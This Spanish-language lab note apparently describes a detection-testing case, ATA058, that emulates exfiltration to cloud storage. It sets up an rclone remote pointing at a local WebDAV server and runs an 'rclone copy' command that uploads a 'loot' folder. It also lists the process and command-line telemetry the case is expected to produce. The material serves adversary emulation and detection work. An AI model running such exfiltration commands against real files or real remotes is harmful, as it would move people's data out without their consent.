# ATA058 - T1567.002 Exfiltration to Cloud Storage (Windows, `victima-windows`)

> **B1.1 (piloto mixto).** Canal **SSH**. **ART adaptado**: `T1567.002` ->
> *Exfiltrate data with rclone to cloud Storage - Mega (Windows)* (`8529ee44-279a-4a19-80bf-b846a40dda58`).

## Que hace

1. Crea `rclone.conf` con un remote WebDAV local (`http://192.168.65.1:9092/`).
2. Ejecuta `rclone.exe copy --max-size 1700k .\loot nube:ATA058/run_<UTC> --config rclone.conf -v`.
3. Escribe `efecto_local.txt` con el remote, el rc y el `sha256` local de los 4 ficheros.

**Adaptacion declarada**: remote Mega -> WebDAV local (`nube.local`), y `rclone.exe`
pre-staged en `C:\lab-attack\_tools\rclone.exe` (fuera del repo). Mecanismo identico.

## Pre-staging (antes de `t0`)

- `rclone.exe` (v1.68.1, `sha256` en `Soporte/Laboratorio/windows/prestaging_material.md`)
  copiado a `C:\lab-attack\_tools\rclone.exe`.
- `loot/` (4 CSV) copiado con el resto de la carpeta del caso.

## Prueba de efecto

Fichero en el bucket WebDAV del HOST (`D:\TFG-VMs\lab-logs\cloud_bucket\ATA058\run_<UTC>\`)
y `sink_webdav.log` con `PUT ... sha256=<hash>`; el hash debe coincidir con el local.

## Esperado

`ATA058_esperado.csv`: `win_image` (`rclone.exe` / `powershell.exe` / `cmd.exe`) + ancla
`win_command_line` con `C:\lab-attack\ATA058`.
